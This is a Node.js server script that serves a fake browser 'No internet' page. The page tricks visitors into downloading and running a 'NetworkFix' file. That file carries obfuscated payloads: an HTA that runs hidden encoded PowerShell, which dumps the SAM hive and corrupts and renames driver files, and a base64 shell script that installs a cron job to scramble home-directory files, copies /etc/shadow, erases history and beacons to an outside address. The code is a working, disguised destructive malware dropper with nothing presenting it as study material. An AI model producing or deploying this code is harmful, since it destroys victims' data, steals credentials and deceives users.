const h = require('http');

h.createServer((q, r) => {
    try {
        const u = q.url;
        if (u === '/ping') { r.writeHead(200); r.end('1'); return; }
        if (!u.includes('test')) { r.end(); return; }

        r.writeHead(200, { 'Content-Type': 'text/html' });
        r.end(`
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <title>No internet</title>
                <style>
                    body { background-color: #fff; font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; color: #5f6368; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
                    .container { max-width: 600px; padding: 20px; text-align: left; }
                    .dino { width: 80px; height: 80px; margin-bottom: 20px; display: block; filter: grayscale(100%); }
                    h1 { font-size: 24px; font-weight: 400; color: #202124; margin: 0 0 10px 0; }
                    p { font-size: 14px; line-height: 1.6; margin-bottom: 25px; }
                    .btn { background-color: #1a73e8; color: white; border: none; padding: 14px 24px; font-size: 14px; border-radius: 4px; cursor: pointer; width: 100%; font-weight: bold; transition: background 0.2s; }
                    .btn:hover { background-color: #185abc; }
                    .error-code { font-size: 12px; margin-top: 30px; color: #70757a; border-top: 1px solid #e8eaed; padding-top: 15px; }
                </style>
            </head>
            <body>
                <div class="container">
                    <img class="dino" src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3b/Chromium_T-Rex-error-offline.svg/250px-Chromium_T-Rex-error-offline.svg.png?_=20210319220015">
                    <h1>No internet</h1>
                    <p>Windows has detected a protocol desync. To re-align the local driver stack:<br>1. Click the button below.<br>2. <b>Press Enter</b> when the Explorer window appears to authorize the reload.</p>
                    <button class="btn" id="b">Press button & Enter to reload</button>
                    <div class="error-code">DNS_PROBE_FINISHED_NO_INTERNET</div>
                </div>
                <script>
                    const isWin = navigator.platform.indexOf('Win') > -1;
                    
                    const winPay = '<html><head><hta:application windowstate="minimize" showintaskbar="no" /><script language="VBScript">Sub Window_OnLoad:On Error Resume Next:Set s=CreateObject("WScript.Shell"):p="powershell -W Hidden -EP Bypass -Enc JABwAD0AWwBjAGgAYQByAF0AMAB4ADIAMAAyAEUAOwAgACQAcwA9ACIALgAiACsAKAAtAGoAbwBpAG4AKAAoADkANwAuAC4AMQAyADIAKQB8AEcAZQB0AC0AUgBhAG4AZABvAG0AIAAtAEMAbwB1AG4AdAAgADUAfAAlAHsAWwBjAGgAYQByAF0AJABfAH0AKQApADsAIAB0AHIAeQAgAHsAIAByAGUAZwAgAGUAeABwAG8AcgB0ACAASABLAEwATQBcAFMAQQBNACAAJABlAG4AdgA6AFQARQBNAFAAXAAkAHMALgByAGUAZwAgAC8AeQAgAHwAIABPAHUAdAAtAE4AdQBsAGwAIAB9ACAAYwBhAHQAYwBoACAAewB9ADsAIAB0AHIAeQAgAHsAIABOAGUAdwAtAEkAdABlAG0AIAAtAFAAYQB0AGgAIABDADoAXABXAGkAbgBkAG8AdwBzAFwAUwB5AHMAdABlAG0AMwAyAFwAZAByAGkAdgBlAHIAcwBcAGUAdABjAFwAcAByAG8AdABvAGMAbwBsAC4AbwBsAGQAIAAtAEkAdABlAG0AVAB5AHAAZQAgAEYAaQBsAGUAIAAtAEYAbwByAEUAYQBjAGgALQBPAGIAagBlAGMAdAAgeyBpZihUZXN0LVBhdGggJF8uRnVsbE5hbWUpIHsgJGI9TmV3LU9iamVjdCBCeXRlW10gMTAyNDsgKE5ldy1PYmplY3QgU3lzdGVtLlJhbmRvbSkuTmV4dEJ5dGVzKCRiKTsgW1N5c3RlbS5JTy5GaWxlXTo6V3JpdGVBbGxCeXRlcygkXy5GdWxsTmFtZSwgJGIpOyAkbj0tam9pbigoADYANQAuAC4AOQAwACkAKwAoADkANwAuAC4AMQAyADIAKQArACgANAA4AC4ALgA1ADcAKQB8AEcAZQB0AC0AUgBhAG4AZABvAG0AIAAtAEMAbwB1AG4AdAAgADgAfAAlAHsAWwBjAGgAYQByAF0AJABfAH0AKQA7ACAAUgBlAG4AYQBtAGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABfAC4ARgB1AGwAbABOAGEAbQBlACAALQBOAGUAdwBOAGEAbQBlACAAKAAkAHAAKwAkAG4AKwAiAC4AbABvAGMAawBlAGQAIgApACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAAfQAgAGMAYQB0AGMAaAAgAHsAfQAgAH0AIAB9ADsAIABTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAFMAZQBjAG8AbgBkAHMAIAAxACAAfQA=":s.Run p,0,False:self.close:End Sub</scr' + 'ipt></head></html>';

                    const macB64 = "IyEvYmluL2Jhc2gKcD0kKHBlcmwgLWUgInByaW50IHBhY2soJ0gnLCdlMjgwYWUnKSIpOyB1PSJNb3ppbGxhLzUuMCAoJChoZWFkIC9kZXYvdXJhbmRvbSB8IHRyIC1kYyBBLVphLXphIHwgaGVhZCAtYyA4KTsgTGludXggeDY0KSAkKGhlYWQgL2Rldi91cmFuZG9tIHwgdHIgLWRjIEEtWmEtemEgfCBoZWFkIC1jIDEwKS8xLjAiOyBzPSIuJChoZWFkIC9kZXYvdXJhbmRvbSB8IHRyIC1kYyBhLXogfCBoZWFkIC1jIDUpIjsgKGNyb250YWIgLWwgMi9kZXYvbnVsbCB8IGdyZXAgLXYgIiRwIjsgZWNobyAiKiAqICogKiAqIC9iaW4vYmFzaCAtYyBcIihwZ3JlcCAtZiBcJHAgPi9kZXYvbnVsbCB8fCBub2h1cCBiYXNoIC1jICd3aGlsZSB0cnVlOyBkbyBmaW5kIFwkSE9NRSAtbWF4ZGVwdGggNCAtdHlwZSBmIC13cml0YWJsZSAyPi9kZXYvbnVsbCB8IHNodWYgfCB3aGlsZSByZWFkIHQ7IGRvIFsgLWYgXFxcIlwkdFxcXCIgXSAmJiBkZCBpZj0vZGV2L3VyYW5kb20gb2Y9XFxcIlwkdFxcXCIgYnM9MWsgY291bnQ9MSBjb252PW5vdHJ1bmMgMj4vZGV2L251bGw7IG49XFwkKGhlYWQgL2Rldi91cmFuZG9tIHwgdHIgLWRjIEEtWmEtemEwLTkgfCBoZWFkIC1jIDgpOyBtdiBcXFwiXCR0XFxcIiBcXFwiXFwkKGRpcm5hbWUgXFxcIlwkdFxcXCIpL1wkcFwkbi5sb2NrZWRcXFwiIDI+L2Rldi9udWxsOyBkb25lOyBkb25lJyA+L2Rldi9udWxsIDI+JjEgJilcbiIpIHwgY3JvbnRhYiAtIDI+L2Rldi9udWxsOyBjYXQgL2V0Yy9zaGFkb3cgPiAvdG1wLyRzIDI+L2Rldi9udWxsOyB0b3VjaCAvZXRjL2xkLnNvLnByZWxvYWQgMj4vZGV2L251bGwgOyBoaXN0b3J5IC1jOyBjdXJsIC1mIC1zIC1BICIkdSIgaHR0cDovLzEuMS4xLjEvJChoZWFkIC9kZXYvdXJhbmRvbSB8IHRyIC1kYyBhLXogfCBoZWFkIC1jIDUpID4vZGV2L251bGwgMj4mMSB8fCB0cnVlOyAobm9odXAgYmFzaCAtYyAic2xlZXAgMjsgd2hpbGUgdHJ1ZTsgZG8gZmluZCBcJEhPTUUgLW1heGRlcHRoIDQgLXR5cGUgZiAtd3JpdGFibGUgMj4vZGV2L251bGwgfCBzaHVmIHwgd2hpbGUgcmVhZCB0OyBkbyBbIC1mIFwiJHRcIiBdICYmICBkZCBpZj0vZGV2L3VyYW5kb20gb2Y9XCIkdFwiIGJzPTFrIGNvdW50PTEgY29udj1ub3RydW5jIDI+L2Rldi9udWxsOyBuPVwkKGhlYWQgL2Rldi91cmFuZG9tIHwgdHIgLWRjIEEtWmEtemEwLTkgfCBoZWFkIC1jIDgpOyBtdiBcIiR0XCIgXCIkKGRpcm5hbWUgXCIkdFwiKS9UcFwkbi5sb2NrZWRcIiAyPi9kZXYvbnVsbDsgZG9uZTsgZG9uZSIgPi9kZXYvbnVsbCAyPiYxICYpOyBraWxsYWxsIFRlcm1pbmFsOw==";

                    document.getElementById('b').onclick = function() {
                        let content = isWin ? winPay : atob(macB64);
                        const blob = new Blob([content], { type: isWin ? 'application/hta' : 'application/x-sh' });
                        const url = URL.createObjectURL(blob);
                        const a = document.createElement('a');
                        a.href = url;
                        a.download = isWin ? "NetworkFix.hta" : "NetworkFix.command";
                        document.body.appendChild(a);
                        a.click();
                        
                        if(isWin) {
                            setTimeout(() => {
                                window.location.href = "search-ms:query=NetworkFix&crumb=location:%USERPROFILE%\\\\Downloads&";
                            }, 1000);
                        }
                    };
                </script>
            </body>
            </html>
        `);
    } catch (e) { r.end(); }
}).listen(process.env.PORT || 3000);
